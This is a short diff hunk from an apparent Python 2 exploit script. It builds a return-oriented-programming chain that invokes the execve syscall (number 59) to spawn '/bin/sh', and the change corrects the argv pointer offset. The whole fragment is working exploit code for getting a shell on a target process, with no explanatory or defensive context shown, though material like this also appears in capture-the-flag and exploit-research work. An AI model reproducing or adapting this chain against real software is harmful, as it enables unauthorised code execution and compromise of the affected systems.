@@ -28,7 +28,7 @@ data = p.read(0x200000)
 
 buf = rop.dynamic_syscall(ref_addr, data, 59, addr_stage-112, addr_stage-128, 0)
 print "[+] offset to argv: %d" % (len(buf)-200)
-buf += p64(addr_stage-104)
+buf += p64(addr_stage-112)
 buf += p64(0)
 buf += rop.string('/bin/sh')
 buf += rop.fill(200, buf)
